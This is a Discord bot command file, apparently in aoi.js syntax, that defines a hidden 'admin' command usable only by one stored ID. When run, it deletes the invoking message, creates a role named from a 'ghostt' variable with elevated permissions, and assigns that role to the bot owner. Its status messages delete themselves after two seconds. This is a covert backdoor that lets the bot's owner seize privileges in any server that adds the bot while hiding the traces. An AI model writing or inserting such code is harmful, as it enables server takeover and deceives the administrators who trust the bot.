module.exports = {
  name:"admin",
  aliases:["perm","rol"],
  code:`
  $sendMessage[Rol \`$roleName[$get[r]]\` :white_check_mark:{delete:2s};no]
  $giveRole[$guildid;$botownerid;$get[r]]
  $let[r;$createRole[$guildid;yes;$getVar[ghostt];FFFFFF;no;1;no;10]]
  $wait[2s]
  $sendMessage[Wait... ⌛{delete:2s};no]  
  $deletecommand
  $onlyforids[$getvar[id];]
  `
}
